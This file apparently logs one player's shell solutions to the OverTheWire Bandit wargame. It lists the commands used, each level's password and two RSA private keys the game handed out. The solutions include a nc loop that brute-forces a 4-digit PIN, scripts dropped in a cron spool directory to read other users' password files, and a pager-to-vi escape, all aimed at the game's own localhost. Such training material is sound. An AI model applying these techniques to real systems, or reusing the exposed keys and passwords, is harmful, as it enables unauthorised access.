@@ -1,0 +1,406 @@
+#bandit1 boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+bandit1@melinda:~$ cat ./*
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+
+bandit2@melinda:~$ cat ./*
+UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+
+bandit3@melinda:~$ cd inhere
+bandit3@melinda:~/inhere$ ls
+bandit3@melinda:~/inhere$ ls -la
+total 12
+drwxr-xr-x 2 root    root    4096 Nov 14  2014 .
+drwxr-xr-x 3 root    root    4096 Nov 14  2014 ..
+-rw-r----- 1 bandit4 bandit3   33 Nov 14  2014 .hidden
+bandit3@melinda:~/inhere$ cat .hidden 
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+
+bandit4@melinda:~/inhere$ strings ./*
+u#Nr
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+B0wPg
+#[:*
+
+bandit5@melinda:~/inhere$ cat $(find ./ -not -executable -and -size 1033c)
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+bandit6@melinda:~$ cat $(find / -user bandit7 -and -group bandit6 -and -size 33c 2>/dev/null)
+HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+
+bandit7@melinda:~$ cat data.txt | grep millionth
+millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+
+bandit8@melinda:~$ cat data.txt | sort | uniq -u
+UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+
+bandit9@melinda:~$ strings data.txt | grep =
+epr~F=K
+7?YD=
+?M=HqAH
+/(Ne=
+C=_"
+I========== the6
+z5Y=
+`h(8=`
+n\H=;
+========== password
+========== ism
+N$=&
+l/a=L)
+f=C(
+========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+ie)=5e
+
+bandit10@melinda:~$ cat data.txt | base64 -d
+The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+
+bandit11@melinda:~$ cat data.txt | python -c "print raw_input().decode('rot13')"
+The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+
+bandit12@melinda:~$ cat data.txt | egrep '([0-9a-f]{4}\s){1,8}' -o --color=never | python -c "print ''.join([x.decode('hex') for x in __import__('sys').stdin.read().replace('\n', ' ').split(' ')])" | gzip -d 2>/dev/null | bzip2 -d > /tmp/garzon/tmp.tar.gz  
+bandit12@melinda:~$ cd /tmp/garzon
+bandit12@melinda:/tmp/garzon$ tar zxf tmp.tar.gz
+bandit12@melinda:/tmp/garzon$ ls -la
+total 1708
+drwxrwxr-x   2 bandit12 bandit12    4096 Sep  3 06:50 .
+drwxrwx-wt 594 root     root     1724416 Sep  3 06:50 ..
+-rw-r--r--   1 bandit12 bandit12   10240 Nov 14  2014 data5.bin
+-rw-rw-r--   1 bandit12 bandit12     436 Sep  3 06:50 tmp.tar.gz
+bandit12@melinda:/tmp/garzon$ file data5.bin 
+data5.bin: POSIX tar archive (GNU)
+bandit12@melinda:/tmp/garzon$ tar xf data5.bin
+bandit12@melinda:/tmp/garzon$ ls -la
+total 1712
+drwxrwxr-x   2 bandit12 bandit12    4096 Sep  3 06:51 .
+drwxrwx-wt 594 root     root     1724416 Sep  3 06:51 ..
+-rw-r--r--   1 bandit12 bandit12   10240 Nov 14  2014 data5.bin
+-rw-r--r--   1 bandit12 bandit12     224 Nov 14  2014 data6.bin
+-rw-rw-r--   1 bandit12 bandit12     436 Sep  3 06:50 tmp.tar.gz
+bandit12@melinda:/tmp/garzon$ file data6.bin
+data6.bin: bzip2 compressed data, block size = 900k
+bandit12@melinda:/tmp/garzon$ bzip2 -d data6.bin
+bzip2: Can't guess original name for data6.bin -- using data6.bin.out
+bandit12@melinda:/tmp/garzon$ ls -la
+total 1720
+drwxrwxr-x   2 bandit12 bandit12    4096 Sep  3 06:51 .
+drwxrwx-wt 594 root     root     1724416 Sep  3 06:51 ..
+-rw-r--r--   1 bandit12 bandit12   10240 Nov 14  2014 data5.bin
+-rw-r--r--   1 bandit12 bandit12   10240 Nov 14  2014 data6.bin.out
+-rw-rw-r--   1 bandit12 bandit12     436 Sep  3 06:50 tmp.tar.gz
+bandit12@melinda:/tmp/garzon$ file data6.bin.out
+data6.bin.out: POSIX tar archive (GNU)
+bandit12@melinda:/tmp/garzon$ tar xf data6.bin.out
+bandit12@melinda:/tmp/garzon$ ls -la
+total 1724
+drwxrwxr-x   2 bandit12 bandit12    4096 Sep  3 06:52 .
+drwxrwx-wt 594 root     root     1724416 Sep  3 06:52 ..
+-rw-r--r--   1 bandit12 bandit12   10240 Nov 14  2014 data5.bin
+-rw-r--r--   1 bandit12 bandit12   10240 Nov 14  2014 data6.bin.out
+-rw-r--r--   1 bandit12 bandit12      79 Nov 14  2014 data8.bin
+-rw-rw-r--   1 bandit12 bandit12     436 Sep  3 06:50 tmp.tar.gz
+bandit12@melinda:/tmp/garzon$ file data8.bin
+data8.bin: gzip compressed data, was "data9.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
+bandit12@melinda:/tmp/garzon$ ls
+data5.bin  data6.bin.out  data8.bin  tmp.tar.gz
+bandit12@melinda:/tmp/garzon$ cat data8.bin | gzip -d
+The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+bandit14@melinda:~$ cat /etc/bandit_pass/bandit14 | nc localhost 30000
+Correct!
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+bandit15@melinda:~$ echo "BfMYroe26WYalil77FoDi9qh59eK5xNr" | openssl s_client -connect localhost:30001 -quiet
+depth=0 CN = li190-250.members.linode.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = li190-250.members.linode.com
+verify return:1
+Correct!
+cluFn7wTiGryunymYOu4RcffSxQluehd
+
+read:errno=0
+
+bandit16@melinda:~$ nmap 127.0.0.1 -p31000-32000 -Pn
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2015-09-03 07:23 UTC
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00087s latency).
+Not shown: 996 closed ports
+PORT      STATE SERVICE
+31046/tcp open  unknown
+31518/tcp open  unknown
+31691/tcp open  unknown
+31790/tcp open  unknown
+31960/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
+
+bandit16@melinda:~$ echo "cluFn7wTiGryunymYOu4RcffSxQluehd" | openssl s_client -connect 127.0.0.1:31790 -quiet
+depth=0 CN = li190-250.members.linode.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = li190-250.members.linode.com
+verify return:1
+Correct!
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+read:errno=0
+
+bandit17@melinda:~$ git diff passwords.new passwords.old
+diff --git a/passwords.new b/passwords.old
+index df60ef6..24b6805 100644
+--- a/passwords.new
++++ b/passwords.old
+@@ -39,7 +39,7 @@ JXtP4x0uLkYlTpvAAgNdmbg14v5ZQ4tK
+ iiUN5vW66SuR15HjN7yJ6WC449Lyt6Tx
+ RMgV0Mc4N5MJAJNkvXCYaIyR4jKeTIR0
+ qGIUuqTovO2NLa48qPht1i2k0bRpu5b2
+-kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
++BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR
+ Xxfu0SAzhFCYGE6On3rAVyY0ajIii6R4
+ OeccxI2IovTRNXN5JcCLzRu0jMebWogw
+ xMN0f3aA7Xn8euSNqRWGpsf0EbU9VMcl
+ 
+ bandit17@melinda:~$ ssh bandit18@localhost cat readme
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is 05:3a:1c:25:35:0a:ed:2f:cd:87:1c:f6:fe:69:e4:f6.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit17/.ssh/known_hosts).
+
+This is the OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+Please note that wargame usernames are no longer level<X>, but wargamename<X>
+e.g. vortex4, semtex2, ...
+
+Note: at this moment, blacksun is not available.
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0640 for '/home/bandit17/.ssh/id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+bad permissions: ignore key: /home/bandit17/.ssh/id_rsa
+bandit18@localhost's password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+bandit19@melinda:~$ echo "cat /etc/bandit_pass/bandit20" > /tmp/exec20 && chmod 777 /tmp/exec20 && ./bandit20-do /tmp/exec20 
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+bandit20@melinda:~$ python
+Python 2.7.6 (default, Jun 22 2015, 17:58:13) 
+[GCC 4.8.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import socket
+>>> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+>>> p=open("/etc/bandit_pass/bandit20","rb").read()
+>>> s.bind(("0.0.0.0", 54321))
+>>> s.listen(1)
+>>> y=s.accept()
+>>> a,b=y
+>>> a.send(p)
+33
+>>> a.send('\n')
+1
+>>> a.recv(10000)
+'gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n'
+
+bandit21@melinda:~$ ls /etc/cron.d/*
+/etc/cron.d/behemoth4_cleanup      /etc/cron.d/melinda-stats          /etc/cron.d/semtex0-32
+/etc/cron.d/cron-apt               /etc/cron.d/natas-session-toucher  /etc/cron.d/semtex0-64
+/etc/cron.d/cronjob_bandit22       /etc/cron.d/natas-stats            /etc/cron.d/semtex0-ppc
+/etc/cron.d/cronjob_bandit23       /etc/cron.d/natas25_cleanup        /etc/cron.d/semtex5
+/etc/cron.d/cronjob_bandit24       /etc/cron.d/natas25_cleanup~       /etc/cron.d/sysstat
+/etc/cron.d/cronjob_bandit24_root  /etc/cron.d/natas26_cleanup        /etc/cron.d/vortex0
+/etc/cron.d/leviathan5_cleanup     /etc/cron.d/natas27_cleanup        /etc/cron.d/vortex20
+/etc/cron.d/manpage3_resetpw_job   /etc/cron.d/php5
+bandit21@melinda:~$ cat /etc/cron.d/cronjob_bandit22
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@melinda:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@melinda:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+bandit22@melinda:~$ cat /etc/cron.d/cronjob_bandit23
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@melinda:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@melinda:~$ cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 "./$i"
+	rm -f "./$i"
+    fi
+done
+
+bandit23@melinda:~$ echo "cat /etc/bandit_pass/bandit24 > /tmp/gggarzon" > /var/spool/bandit24/tmp.sh && chmod 777 /var/spool/bandit24/tmp.sh
+bandit23@melinda:~$ cat /tmp/gggarzon
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+bandit24@melinda:~$ j=$(cat /etc/bandit_pass/bandit24)
+bandit24@melinda:~$ i=0; while [ $i -lt 10000 ]; do printf "%s %04d\n" $j $i | nc 127.0.0.1 30002 >> /tmp/ggarzon; let i=i+1; done
+bandit24@melinda:~$ cat /tmp/ggarzon | awk '{ print NR }' | tail
+18372
+18373
+18374
+18375
+18376
+18377
+18378
+18379
+18380
+18381
+bandit24@melinda:~$ cat /tmp/ggarzon | sort | uniq -u
+
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+bandit25@melinda:~$ cat .pin
+5669
+
+bandit25@melinda:~$ cat ./bandit26.sshkey 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+
+bandit25@melinda:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@melinda:~$ cat /usr/bin/showtext 
+#!/bin/sh
+
+more ~/text.txt
+exit 0
+bandit25@melinda:~$ ssh -i bandit26.sshkey bandit26@localhost
+Could not create directory '/home/bandit25/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is 05:3a:1c:25:35:0a:ed:2f:cd:87:1c:f6:fe:69:e4:f6.
+Are you sure you want to continue connecting (yes/no)? yes
+
+ _                     _ _ _   ___   __  
+ | |                   | (_) | |__ \ / /  
+ | |__   __ _ _ __   __| |_| |_   ) / /_  
+--More--(50%) v
+
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+"~/text.txt" [readonly] 6L, 258C               
+:r /etc/bandit_pass/bandit26
+W10: Warning: Changing a readonly file
+E325: ATTENTION
+Found a swap file by the name "/var/tmp/text.txt.swp"
+-- More --
+          owned by: bandit26   dated: Thu Nov 27 19:08:41 2014
+         file name: ~bandit26/text.txt
+          modified: YES
+         user name: bandit26   host name: melinda
+        process ID: 15764
+While opening file "text.txt"
+             dated: Sun Nov 16 17:01:04 2014
+
+(1) Another program may be editing the same file.  If this is the case,
+    be careful not to end up with two different instances of the same
+    file when making changes.  Quit, or continue with caution.
+(2) An edit session for this file crashed.
+    If this is the case, use ":recover" or "vim -r text.txt"
+    to recover the changes (see ":help recovery").
+    If you did this already, delete the swap file "/var/tmp/text.txt.swp"
+    to avoid this message.
+
+E326: Too many swap files found
+E325: ATTENTION
+Found a swap file by the name "/tmp/text.txt.swp"
+          owned by: bandit26   dated: Mon Aug 31 00:59:04 2015
+         file name: ~bandit26/text.txt
+          modified: YES
+         user name: bandit26   host name: melinda
+                   owned by: bandit26   dated: Thu Nov 27 19:08:41 2014
+         file name: ~bandit26/text.txt
+          modified: YES
+         user name: bandit26   host name: melinda
+        process ID: 15764
+While opening file "text.txt"
+             dated: Sun Nov 16 17:01:04 2014
+
+(1) Another program may be editing the same file.  If this is the case,
+    be careful not to end up with two different instances of the same
+  _                     _ _ _   ___   __
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
+:q!
+q
